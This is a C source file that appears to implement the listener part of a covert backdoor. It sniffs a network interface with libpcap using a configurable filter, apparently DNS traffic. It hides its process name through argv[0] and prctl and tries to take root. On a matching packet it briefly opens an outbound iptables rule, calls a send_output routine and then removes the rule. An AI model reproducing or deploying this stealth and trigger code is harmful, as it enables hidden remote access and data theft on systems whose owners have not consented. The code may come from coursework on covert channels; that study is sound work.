#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <string.h>
#include "config.h"

// ./pkt_cap3 "udp dst port 53"
// Function Prototypes
void pkt_callback(u_char *, const struct pcap_pkthdr *, const u_char *);
void send_output();
int packet_handler(u_char *ptrnull, const struct pcap_pkthdr *pkt_info, const u_char *packet);

int main(int argc, char **argv)
{
    char *nic_dev;
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *nic_descr;
    struct bpf_program fp; // holds the compiled program
    bpf_u_int32 maskp;     // subnet mask
    bpf_u_int32 netp;      // ip

    /*masking the process*/
    memset(argv[0], 0, strlen(argv[0]));
    strcpy(argv[0], MASK);
    prctl(PR_SET_NAME, MASK, 0, 0);

    setuid(0);
    setgid(0);

    // find the first NIC that is up and sniff packets from it
    // nic_dev = pcap_lookupdev(errbuf);
    nic_dev = NIC_NAME;
    if (nic_dev == NULL)
    {
        fprintf(stderr, "%s\n", errbuf);
        exit(1);
    }

    // Use pcap to get the IP address and subnet mask of the device
    pcap_lookupnet(nic_dev, &netp, &maskp, errbuf);

    // open device for reading

    // set the device in promiscuous mode
    nic_descr = pcap_open_live(nic_dev, BUFSIZ, 1, -1, errbuf);
    if (nic_descr == NULL)
    {
        printf("pcap_open_live(): %s\n", errbuf);
        exit(1);
    }

    // Compile the filter expression
    if (pcap_compile(nic_descr, &fp, SNIFFER_FILTER, 0, netp) == -1)
    {
        fprintf(stderr, "Error calling pcap_compile\n");
        exit(1);
    }

    // Load the filter into the capture device
    if (pcap_setfilter(nic_descr, &fp) == -1)
    {
        fprintf(stderr, "Error setting filter\n");
        exit(1);
    }

    // Start the capture session
    pcap_loop(nic_descr, -1, pkt_callback, NULL);

    return 0;
}

// This is the callback function that is passed to pcap_loop(..)
// and called each time a packet is received
void pkt_callback(u_char *ptr_null, const struct pcap_pkthdr *pkthdr, const u_char *packet)
{
    int valid;
    if ((valid = packet_handler(ptr_null, pkthdr, packet)))
    {
        char rule_allow[MAX_SIZE] = "";
        char rule_del[MAX_SIZE] = "";
        snprintf(rule_allow, sizeof(rule_allow), "iptables -o %s -A OUTPUT -p tcp --dport %s -j ACCEPT", NIC_NAME, CLIENT_PORT);
        snprintf(rule_del, sizeof(rule_del), "iptables -o %s -D OUTPUT -p tcp --dport %s -j ACCEPT", NIC_NAME, CLIENT_PORT);
        system(rule_allow);
        send_output();
        system(rule_del);
    }
}